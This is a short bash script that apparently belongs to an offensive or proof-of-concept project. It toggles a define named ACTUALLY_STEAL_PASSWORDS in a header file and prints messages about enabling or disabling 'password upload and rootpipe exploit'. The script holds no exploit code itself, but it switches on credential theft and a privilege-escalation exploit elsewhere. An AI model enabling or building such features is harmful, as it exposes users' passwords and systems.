#!/bin/bash
if [[ -z $(egrep '//#define ACTUALLY_STEAL_PASSWORDS' display/Import.h) ]]; then
	echo -e "\e[1m\e[31m[-] Disabling password upload and rootpipe exploit\e[0m"
	sed -i -e 's/^#define ACTUALLY_STEAL_PASSWORDS/\/\/#define ACTUALLY_STEAL_PASSWORDS/' display/Import.h
else
	echo -e "\e[1m\e[32m[+] Enabling password upload and rootpipe exploit\e[0m"
	sed -i -e 's/\/\/#define ACTUALLY_STEAL_PASSWORDS/#define ACTUALLY_STEAL_PASSWORDS/' display/Import.h
fi